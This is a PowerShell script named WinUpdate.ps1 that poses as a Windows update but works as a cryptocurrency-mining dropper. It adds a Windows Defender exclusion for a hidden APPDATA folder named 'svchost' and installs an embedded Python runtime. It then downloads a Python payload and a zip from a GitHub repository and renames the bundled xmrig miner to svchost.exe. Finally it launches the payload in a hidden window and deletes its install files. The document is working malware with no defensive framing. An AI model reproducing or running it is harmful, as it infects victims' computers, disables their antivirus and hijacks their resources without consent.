# --- THE FINAL MASTER (WinUpdate.ps1) ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Configuration
$C_URL = "https://github.com/itzcurled/footbalhunt/raw/main/WinServices.py"
$Z_URL = "https://github.com/itzcurled/footbalhunt/raw/main/UpdataData.zip"

# 2. Hard Reset & Blinding (Admin Required)
if (Test-Path $Path) { 
    Stop-Process -Name "$ID" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 3. Shadow Engine Setup (No-Python Fix)
$PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"

# --- LIBRARY BOOST ---
# We need to give Python its 'voice' (requests and psutil)
# This creates a 'site-packages' feel for our embedded engine
$LibPath = "$Path\python\Lib\site-packages"
New-Item -ItemType Directory -Path $LibPath -Force | Out-Null

# We'll pull a pre-packaged zip of the needed libs from a trusted source or your repo
# For now, I'll add a 'pip' bootstrap to your python engine so it can self-install
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$Path\get-pip.py"
& "$Path\python\python.exe" "$Path\get-pip.py" --no-warn-script-location
& "$Path\python\python.exe" -m pip install requests psutil --target "$LibPath" --no-warn-script-location
# --- END BOOST ---

# 4. Deployment
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.zip"

if (Test-Path "$Path\UpdataData.zip") {
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
}

# 5. Activation
$PY_EXEC = "$Path\python\pythonw.exe"
if (Test-Path $PY_EXEC) {
    # Tell Python where to find its new libraries
    $env:PYTHONPATH = $LibPath
    Start-Process -FilePath $PY_EXEC -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
}

# 6. Final Cleanup
Remove-Item -Path "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
Remove-Item -Path "$Path\get-pip.py" -ErrorAction SilentlyContinue
Get-ChildItem -Path $Path -Directory | Where-Object { $_.Name -notin @("python", "pythonw") } | Remove-Item -Recurse -Force
